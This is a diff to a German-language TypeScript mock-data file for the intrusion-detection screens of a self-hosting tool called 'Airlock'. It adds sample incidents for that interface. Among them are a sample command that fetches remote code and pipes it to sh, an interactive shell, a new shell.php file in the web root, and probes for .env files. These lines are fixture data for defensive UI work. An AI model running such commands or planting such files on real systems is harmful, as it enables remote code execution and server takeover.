@@ -1134,6 +1134,7 @@ export const notifications: NotifySettingsDto = {
     backup_stale: { push: true, email: true },
     gateway_warning: { push: false, email: false },
     disk_space: { push: true, email: true },
+    incident: { push: true, email: true },
   },
 }
 
@@ -1756,5 +1757,81 @@ export function repoCheck(variant: RepoCheckVariant): import('@airlock/shared').
     ok: false, code: 'host_key_unknown', link: null,
     message: 'Erste Verbindung zu gitlab.com: Vergleiche den Fingerabdruck mit dem, den der Anbieter veröffentlicht, und bestätige ihn. Danach verbindet Airlock nur noch mit genau diesem Schlüssel.',
     hostKey: { host: 'gitlab.com', keys: gitlabHostKeys },
+  }
+}
+
+/* --- Nacht 3, Etappe 5: Einbruchserkennung ----------------------------------------- */
+
+type Incident = import('@airlock/shared').IntrusionIncidentDto
+/** ruhig: überwacht, keine Vorfälle; vorfaelle: offene Vorfälle; isoliert: dazu isoliert; lernt: neuer Container; leer: keine Vorfälle */
+export type IntrusionVariant = 'ruhig' | 'vorfaelle' | 'isoliert' | 'lernt' | 'leer'
+
+const FOTO = { id: 'p-foto', name: 'Fotoalbum' }
+function incident(o: Partial<Incident> & Pick<Incident, 'id' | 'kind' | 'source' | 'severity' | 'title'>): Incident {
+  return {
+    project: FOTO, status: 'offen', subject: null, service: 'web', count: 1, firstSeen: ago(40 * MIN), lastSeen: ago(12 * MIN),
+    note: null, samples: [], notifiedAt: null, reactedAt: null, canMarkNormal: false, ...o,
+  }
+}
+
+export function intrusionIncidentRows(): Incident[] {
+  return [
+    incident({
+      id: 'inc-shell', kind: 'prozess_verdaechtig', source: 'prozess', severity: 'hoch', title: 'Shell gestartet: sh (Dienst web)', subject: 'sh',
+      count: 2, samples: ['sh -c curl -s http://203.0.113.7/x | sh', 'sh -i'], notifiedAt: ago(11 * MIN), canMarkNormal: true,
+    }),
+    incident({
+      id: 'inc-webroot', kind: 'datei_webroot', source: 'datei', severity: 'hoch', title: 'Dateien im Webroot geändert (Dienst web)',
+      subject: '/usr/share/nginx/html/shell.php', samples: ['/usr/share/nginx/html/shell.php (neu)'], notifiedAt: ago(9 * MIN), canMarkNormal: true, lastSeen: ago(9 * MIN),
+    }),
+    incident({
+      id: 'inc-login', project: null, service: null, kind: 'login_fehlversuche', source: 'anmeldung', severity: 'mittel', title: 'Viele Fehlversuche von 192.168.1.77',
+      subject: '192.168.1.77', count: 7, samples: ['falsches Passwort (7×)'], status: 'gesehen', lastSeen: ago(3 * HOUR), firstSeen: ago(3 * HOUR + 4 * MIN),
+    }),
+    incident({
+      id: 'inc-egress', project: { id: 'p-kontoauszug', name: 'Kontoauszug-Reader' }, service: null, kind: 'netz_gesperrt', source: 'netz', severity: 'mittel',
+      title: 'Gesperrte Verbindungsversuche nach draussen', subject: '192.168.1.10:445', count: 12, samples: ['192.168.1.10:445/tcp (12×)'], canMarkNormal: true,
+      lastSeen: ago(5 * HOUR), firstSeen: ago(2 * DAY),
+    }),
+    incident({
+      id: 'inc-scan', project: { id: 'p-haushalt', name: 'Haushaltsbuch' }, service: null, kind: 'web_scan', source: 'web', severity: 'niedrig',
+      title: 'Scan von aussen (Scanner-Pfade, 4xx)', count: 64, samples: ['41 Scanner-Pfade, 23 weitere 4xx, 6 Absender in dieser Stunde', '/wp-login.php (18×)', '/.env (11×)'],
+      lastSeen: ago(DAY), firstSeen: ago(6 * DAY),
+    }),
+  ]
+}
+
+export function intrusionIncidents(v: IntrusionVariant = 'vorfaelle', status = 'aktiv'): import('@airlock/shared').IncidentListDto {
+  const empty = { niedrig: 0, mittel: 0, hoch: 0, kritisch: 0 }
+  if (v === 'leer') return { incidents: [], counts: { active: empty, unseen: 0 } }
+  const all = intrusionIncidentRows()
+  const done = incident({ id: 'inc-neu', kind: 'prozess_neu', source: 'prozess', severity: 'mittel', title: 'Neues Programm: convert (Dienst web)', subject: 'convert', status: 'erledigt', samples: ['convert /data/upload.jpg -resize 800 /data/thumb.jpg'], lastSeen: ago(3 * DAY), firstSeen: ago(3 * DAY) })
+  const list = status === 'erledigt' ? [done] : status === 'alle' ? [...all, done] : status === 'offen' ? all.filter((i) => i.status === 'offen') : status === 'gesehen' ? all.filter((i) => i.status === 'gesehen') : all
+  return { incidents: list, counts: { active: { niedrig: 1, mittel: 2, hoch: 2, kritisch: 0 }, unseen: 4 } }
+}
+
+export function intrusionIncident(id: string): import('@airlock/shared').IntrusionIncidentDetailDto {
+  const i = intrusionIncidentRows().find((x) => x.id === id) ?? intrusionIncidentRows()[0]!
+  return {
+    ...i,
+    events: [
+      { at: ago(11 * MIN), kind: 'gemeldet', text: 'Per Push gemeldet', actor: null },
+      { at: ago(12 * MIN), kind: 'erneut', text: 'Erneut gesehen (+1, insgesamt 2×)', actor: null },
+      { at: ago(40 * MIN), kind: 'erkannt', text: `Erkannt (Hoch): ${i.samples[0] ?? i.title}`, actor: null },
+    ],
+  }
+}
+
+export function intrusion(v: IntrusionVariant = 'ruhig'): import('@airlock/shared').ProjectIntrusionDto {
+  const watch = v === 'lernt'
+    ? { state: 'lernt' as const, learnUntil: new Date(Date.now() + 7 * MIN).toISOString(), containers: 3, lastCheckAt: ago(MIN) }
+    : { state: 'aktiv' as const, learnUntil: null, containers: 3, lastCheckAt: ago(MIN) }
+  const incidents = v === 'vorfaelle' || v === 'isoliert' ? intrusionIncidentRows().filter((i) => i.project?.id === 'p-foto') : []
+  return {
+    watch,
+    incidents,
+    autoStop: false,
+    isolation: v === 'isoliert' ? { at: ago(4 * MIN), by: 'ui:joel' } : null,
+    normal: v === 'vorfaelle' || v === 'isoliert' ? [{ kind: 'prozess', service: 'worker', value: 'convert' }] : [],
   }
 }
